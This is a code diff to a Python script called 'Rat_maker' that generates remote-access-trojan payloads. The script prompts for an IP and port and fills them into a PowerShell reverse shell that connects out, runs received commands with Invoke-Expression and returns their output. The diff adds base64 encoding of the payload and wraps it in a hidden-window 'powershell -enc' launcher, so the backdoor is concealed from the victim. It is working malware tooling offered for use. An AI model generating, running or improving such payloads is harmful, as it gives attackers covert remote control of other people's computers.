@@ -1,16 +1,24 @@
 import os
 import time
+import base64
 import socket
 import colorama
 
 colorama.init()
 
-
 print(colorama.Fore.RED + "\nRat_maker...\n")
 
 payloads = [
-    ["powershell", """While($True){Try{$client = New-Object System.Net.Sockets.TcpClient;$client.Connect("<ip>", <port>);$stream = $client.GetStream();While ($True) {;$buffer = New-Object System.Byte[] 4024;$read = $stream.Read($buffer, 0, 4024);$msg = [System.Text.Encoding]::ASCII.GetString($buffer,0, $read);$Output = Invoke-Expression $msg 2>&1 | Out-String;$message = [System.Text.Encoding]::ASCII.GetBytes($Output);$stream.Write($message, 0, $message.Length);}} catch {}}"""],
+    ["powershell", """While($True){\nTry{$client = New-Object System.Net.Sockets.TcpClient;\n$client.Connect("<ip>", <port>);\n$stream = $client.GetStream();\nWhile ($True) {;\n$buffer = New-Object System.Byte[] 4024;\n$read = $stream.Read($buffer, 0, 4024);\n$msg = [System.Text.Encoding]::ASCII.GetString($buffer,0, $read);\n$Output = Invoke-Expression $msg 2>&1 | Out-String;\n$message = [System.Text.Encoding]::ASCII.GetBytes($Output);\n$stream.Write($message, 0, $message.Length);\n}\n} catch {\n}\n}""", "Start-Process powershell.exe {powershell.exe -enc", "} -WindowStyle hidden"],
+    ["batch",      """While($True){\nTry{$client = New-Object System.Net.Sockets.TcpClient;\n$client.Connect("<ip>", <port>);\n$stream = $client.GetStream();\nWhile ($True) {;\n$buffer = New-Object System.Byte[] 4024;\n$read = $stream.Read($buffer, 0, 4024);\n$msg = [System.Text.Encoding]::ASCII.GetString($buffer,0, $read);\n$Output = Invoke-Expression $msg 2>&1 | Out-String;\n$message = [System.Text.Encoding]::ASCII.GetBytes($Output);\n$stream.Write($message, 0, $message.Length);\n}\n} catch {\n}\n}""", """powershell -Command "Start-Process powershell.exe {powershell.exe -enc""", """} -WindowStyle hidden" """]
 ]
+
+def encrypt_string(text):
+    utf16le_bytes = text.encode('utf-16le')
+
+    base64_encoded = base64.b64encode(utf16le_bytes).decode('utf-8')
+
+    return base64_encoded
 
 while True:
     print("")
@@ -25,7 +33,7 @@ while True:
         port = input("PORT>")
 
         print("")
-        print(payloads[n][1].replace("<ip>", ip).replace("<port>", f"{port}"))
+        print(payloads[n][2], encrypt_string(payloads[n][1].replace("<ip>", ip).replace("<port>", f"{port}")), payloads[n][3])
         print("")
         break
 
